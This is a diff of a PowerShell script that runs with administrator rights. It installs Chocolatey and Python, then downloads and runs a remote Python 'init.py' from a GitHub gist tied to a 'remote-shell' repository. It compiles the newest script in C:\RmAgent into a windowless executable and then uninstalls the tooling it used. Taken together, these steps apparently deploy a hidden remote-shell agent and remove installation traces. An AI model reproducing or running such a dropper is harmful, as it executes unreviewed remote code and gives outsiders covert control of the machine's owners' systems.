@@ -3,7 +3,8 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     exit 1
 }
 
-# ------------------- Functions -------------------
+#──────────────────────────────────────────────────────────────────────────────────────────────────────────#
+#                                          Chocolatey configuration
 
 function Remove-Chocolatey {
     if (Get-Command choco -ErrorAction SilentlyContinue) {
@@ -40,6 +41,9 @@ function Install-Chocolatey {
     }
 }
 
+#──────────────────────────────────────────────────────────────────────────────────────────────────────────#
+#                                           Python configuration
+
 function Install-Python {
     Write-Host "Installing Python via Chocolatey..."
     choco install -y python
@@ -64,9 +68,22 @@ function Install-PythonPackages {
     }
 }
 
+function Uninstall-Python {
+    Write-Host "Uninstalling Python via Chocolatey..."
+    choco uninstall -y python
+    if (Get-Command python -ErrorAction SilentlyContinue) {
+        Write-Warning "Python is still present in the system!"
+    } else {
+        Write-Host "Python uninstalled successfully."
+    }
+}
+
+#──────────────────────────────────────────────────────────────────────────────────────────────────────────#
+#                                            Script execution
+
 function Run-RemotePythonScript {
     param (
-        [string]$url = "https://raw.githubusercontent.com/gnegn/remote-shell/refs/heads/main/agent/init.py"
+        [string]$url = "https://gist.githubusercontent.com/gnegn/2f3b86c264117e359ea1fad429a7ecda/raw/0661276c7cf6abb7ed688feac9f8de719b969fdc/init.py"
     )
 
     Write-Host "Downloading remote Python script..."
@@ -88,17 +105,58 @@ function Run-RemotePythonScript {
     }
 }
 
-function Uninstall-Python {
-    Write-Host "Uninstalling Python via Chocolatey..."
-    choco uninstall -y python
-    if (Get-Command python -ErrorAction SilentlyContinue) {
-        Write-Warning "Python is still present in the system!"
-    } else {
-        Write-Host "Python uninstalled successfully."
+#──────────────────────────────────────────────────────────────────────────────────────────────────────────#
+#                                            PyInstaller
+
+function Build-LatestPythonExe {
+    param (
+        [string]$FolderPath = "C:\RmAgent"
+    )
+
+    if (-not (Get-Command pyinstaller -ErrorAction SilentlyContinue)) {
+        Write-Host "PyInstaller not found."
+        return
     }
+
+    $latestPythonFile = Get-ChildItem -Path $FolderPath -Filter "*.py" -File |
+                        Sort-Object CreationTime -Descending |
+                        Select-Object -First 1
+
+    if (-not $latestPythonFile) {
+        Write-Host "No Python files found in $FolderPath"
+        return
+    }
+
+    Write-Host "Found last Python file: $($latestPythonFile.FullName)"
+    $currentDir = Get-Location
+
+    try {
+        Set-Location -Path $FolderPath
+
+        $exeOutputPath = $FolderPath
+        $pyinstallerCmd = "pyinstaller --onefile --noconsole --distpath `"$exeOutputPath`" `"$($latestPythonFile.FullName)`""
+
+        Write-Host "Runiing PyInstaller..."
+        Invoke-Expression $pyinstallerCmd
+    }
+    finally {
+        Set-Location -Path $currentDir
+    }
+
+    $buildFolder = Join-Path $FolderPath "build"
+    $specFile = Join-Path $FolderPath ($latestPythonFile.BaseName + ".spec")
+
+    if (Test-Path $buildFolder) { Remove-Item $buildFolder -Recurse -Force }
+    if (Test-Path $specFile) { Remove-Item $specFile -Force }
+
+    Write-Host "EXE created in $exeOutputPath"
 }
 
-# ------------------- MAIN SCRIPT -------------------
+
+
+
+#──────────────────────────────────────────────────────────────────────────────────────────────────────────#
+#                                            Main script
 
 Remove-Chocolatey
 Install-Chocolatey
@@ -106,6 +164,7 @@ Install-Python
 Install-PythonPackages
 
 Run-RemotePythonScript
+Build-LatestPythonExe
 
 Uninstall-Python
 Remove-Chocolatey
